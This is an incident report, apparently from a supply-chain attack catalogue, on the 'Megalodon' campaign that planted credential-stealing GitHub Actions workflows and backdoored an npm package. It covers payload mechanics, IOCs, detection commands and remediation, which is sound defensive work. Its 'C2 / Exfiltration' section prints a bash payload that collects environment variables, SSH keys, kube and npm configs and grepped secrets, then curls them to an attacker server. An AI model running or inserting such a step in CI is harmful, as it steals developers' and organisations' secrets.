# Megalodon — Mass GitHub Actions Secret Exfiltration Across 5,500+ Public Repositories

**Date:** May 2026
**Ecosystem:** GitHub Actions / npm
**Severity:** High
**Type:** Direct Poisoned Pipeline Execution (d-PPE) / CI Secret Theft
**Sources:**
- [StepSecurity — Megalodon: Mass GitHub Actions Secret Exfiltration Across 5,500+ Public Repositories](https://www.stepsecurity.io/blog/megalodon-mass-github-actions-secret-exfiltration-across-5-500-public-repositories)

---

## Summary

On May 18, 2026, a large-scale supply chain campaign tracked as **Megalodon** injected malicious GitHub Actions workflow files into 5,561 open-source repositories within a single six-hour window. The campaign targeted repositories with weak or absent branch protection rules, pushing backdoored CI workflow files disguised as routine build optimisations (`ci: add build optimization step`, `chore: optimize pipeline runtime`). Once merged, the workflows execute on every subsequent pipeline run, exfiltrating cloud credentials, SSH keys, API tokens, and GitHub Actions OIDC tokens to an attacker-controlled server before any runner completes its job.

The attack is a textbook **direct Poisoned Pipeline Execution (d-PPE)**: the attacker pushed directly to the default branch, bypassing pull request review entirely. MITRE ATT&CK classifies this as T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain). The key enabling condition is a repository configuration that grants write access without mandatory review — a gap Megalodon exploited at industrial scale.

The most impactful downstream consequence was the infection of Tiledesk, an open-source live chat and chatbot platform with an npm package (`@tiledesk/tiledesk-server`) that was backdoored across seven published versions (2.18.6–2.18.12), propagating the campaign from the repository level into the npm registry and onto downstream consumer machines.

---

## Compromised Artifacts

| Repository / Package | Malicious Workflow / Version |
|---------------------|------------------------------|
| 5,561 GitHub repositories (total) | Injected `SysDiag.yml` or `Optimize-Build.yml` workflow |
| `tiledesk/tiledesk-server` (+ 8 other Tiledesk repos) | Backdoor propagated to npm `@tiledesk/tiledesk-server` v2.18.6–2.18.12 |
| Black-Iron-Project (8 repos) | Targeted variant of the same campaign |
| WISE-Community repos | Confirmed affected |

---

## How It Worked

### Entry Point

The attacker obtained write access to the default branch of repositories without mandatory pull request review protections. Using forged author identities (`build-bot@github-ci.com`, `ci-pipeline@actions-bot.com`) and bot-like commit messages that blend into high-velocity repositories, they pushed new or modified workflow YAML files named `ci.yml` or `docker-community-worker-push-latest.yml`. The workflow `name:` field was set to `SysDiag` or `Optimize-Build` to appear routine.

Two variants were observed, differing only in their trigger condition (push vs. pull_request), but carrying identical payloads.

### Payload Mechanics

Both workflow variants contain a base64-encoded bash payload that decodes and executes inline during the CI run. On execution the payload performs the following collection sequence:

1. **Environment dump**: Full CI environment (`env`), `/proc/*/environ` for all running processes, and PID 1 environment data
2. **Cloud credentials**: AWS access keys and session tokens; GCP OAuth tokens; Azure IMDS responses and instance role credentials
3. **Authentication material**: SSH private keys, Docker registry configs (`~/.docker/config.json`), `.npmrc` tokens, Kubernetes configs (`~/.kube/config`), HashiCorp Vault tokens, Terraform credentials
4. **CI/CD tokens**: GitHub Actions OIDC tokens (minted via `id-token: write` permission), GitLab CI/CD tokens, Bitbucket pipeline tokens
5. **Source code secrets**: Filesystem grep across the workspace for 30+ secret patterns — API keys, connection strings, JWTs, PEM certificates, `.env` files, `credentials.json`, `service-account.json`

### C2 / Exfiltration

All harvested data is compressed into a single archive and transmitted via HTTPS POST to **`216.126.225.129:8443`** (`/collect` endpoint). The payload uses the GitHub Actions runner's unrestricted outbound internet access. No process anomaly or crash is visible; the workflow step exits cleanly after exfiltration.

```
# Decoded exfiltration sequence (representative)
DATA=$(env; cat /proc/1/environ 2>/dev/null; \
  cat ~/.ssh/id_* 2>/dev/null; \
  cat ~/.kube/config 2>/dev/null; \
  cat ~/.npmrc 2>/dev/null; \
  grep -rE "(API_KEY|SECRET|TOKEN|PASSWORD|PRIVATE_KEY|BEGIN RSA)" . 2>/dev/null)
echo "$DATA" | gzip | curl -s -X POST \
  https://216.126.225.129:8443/collect \
  -H "Content-Type: application/octet-stream" \
  --data-binary @-
```

### Downstream npm Propagation

Because the Tiledesk repositories were among the affected repositories, and because Tiledesk publishes `@tiledesk/tiledesk-server` to npm as part of their CI/CD pipeline, the poisoned workflow caused seven consecutive npm versions to be published with the backdoor embedded, propagating the campaign from the GitHub layer into the npm registry and onto any machine installing those versions.

---

## Timeline

| Date / Time (UTC) | Event |
|-------------------|-------|
| May 18, 2026 | Campaign begins; 5,561 repositories receive malicious workflow commits within a 6-hour window |
| May 18, 2026 | Forged commits pushed with identities `build-bot@github-ci.com` and `ci-pipeline@actions-bot.com` |
| May 18, 2026 | `@tiledesk/tiledesk-server` v2.18.6–2.18.12 published to npm with backdoor |
| May 22, 2026 | StepSecurity publishes Megalodon campaign analysis and IOCs |
| May 22, 2026 | SafeDep publishes full dataset of 5,718 malicious commits as `megalodon-campaign-commits.csv` |

---

## Detection

```bash
# Search GitHub for affected workflow file content (mass variant)
# GitHub code search: name: SysDiag in workflow files
# GitHub code search: filename SysDiag.yml in .github/workflows/

# Search for targeted variant
# GitHub code search: name: Optimize-Build in workflow files
# GitHub code search: filename Optimize-Build.yml in .github/workflows/

# Search by forged commit author email
# Commits by: build-bot@github-ci.com
# Commits by: ci-pipeline@actions-bot.com

# Search by commit message patterns
# git log --all --oneline | grep -E "ci: add build optimization step|chore: optimize pipeline runtime|chore: update ci/cd pipeline"

# Check for the known anchor commit hash (Tiledesk)
git log --all | grep acac5a9854650c4ae2883c4740bf87d34120c038

# Check if @tiledesk/tiledesk-server is installed at a poisoned version
npm ls @tiledesk/tiledesk-server
# Affected versions: 2.18.6 through 2.18.12

# Check for outbound connections to C2 in CI logs
# Look for HTTPS POST to: 216.126.225.129:8443

# If using StepSecurity Harden-Runner, check network events for:
# https://app.stepsecurity.io → Network Events tab → filter for 216.126.225.129

# Grep workflow files for the base64-encoded payload marker
grep -r "base64 --decode\|base64 -d" .github/workflows/ 2>/dev/null
grep -rE "[A-Za-z0-9+/]{200,}={0,2}" .github/workflows/ 2>/dev/null
```

---

## Remediation

1. **Audit `.github/workflows/`** for files named `SysDiag.yml`, `Optimize-Build.yml`, or any `ci.yml` / `docker-*.yml` modified by `build-bot@github-ci.com` or `ci-pipeline@actions-bot.com`
2. **Remove the malicious workflow files** and force-push the corrected branch if the files landed on the default branch
3. **Rotate all CI secrets** accessible in any run after the malicious commit landed — treat AWS keys, GCP tokens, Azure credentials, SSH private keys, GitHub PATs, `.npmrc` tokens, and Kubernetes configs as compromised
4. **Enable branch protection** on all public repositories: require pull request reviews before merging to the default branch. This converts a d-PPE opportunity into the harder i-PPE problem where an attacker must trick a reviewer
5. **If using `@tiledesk/tiledesk-server`**: update to a version outside the 2.18.6–2.18.12 range and rotate all credentials accessible to environments where the poisoned version ran
6. **Install Harden-Runner** or equivalent egress monitoring to block and alert on unexpected outbound connections from CI runners; the payload is undetectable without egress monitoring once dropper files are removed
7. **Review the SafeDep `megalodon-campaign-commits.csv` dataset** to confirm whether any repositories you depend on were affected
8. **Restrict outbound internet access** from self-hosted CI runners using allowlists; hosted GitHub Actions runners should use Harden-Runner to enforce egress policies

---

## Lessons Learned

- Repositories without mandatory PR review on the default branch are a direct d-PPE attack surface; this single configuration gap enabled 5,561 compromises in 6 hours
- Workflow YAML files receive far less security scrutiny than application code — attackers exploit this blind spot with bot-like commit messages that blend into high-velocity repos
- CI runners have broad outbound internet access by default with no firewall; without egress monitoring (e.g., Harden-Runner), the only forensic artifact is network traffic — and most hosted runner environments do not capture it
- The propagation from GitHub repository to npm registry via compromised CI/CD shows how a single upstream compromise multiplies into downstream package registry poisoning
- OIDC token theft is particularly damaging: tokens minted via `id-token: write` authenticate directly to cloud providers without static credentials, and the theft leaves no permanent secret to rotate — only the cloud provider's token issuance logs reveal the abuse

---

## Related Incidents

- [./2026-05-actions-cool-issues-helper.md](./2026-05-actions-cool-issues-helper.md) — GitHub Actions tag-moving attack; same CI secret theft pattern
- [./2026-05-nx-console-vscode.md](./2026-05-nx-console-vscode.md) — GitHub Actions runner secret theft via orphan commit
- [./2025-09-ghostaction-campaign.md](./2025-09-ghostaction-campaign.md) — Prior mass GitHub Actions secret exfiltration campaign (327 accounts, 817 repos)
- [./2025-03-tj-actions.md](./2025-03-tj-actions.md) — All version tags poisoned; CI secrets leaked to logs in 23K+ repos
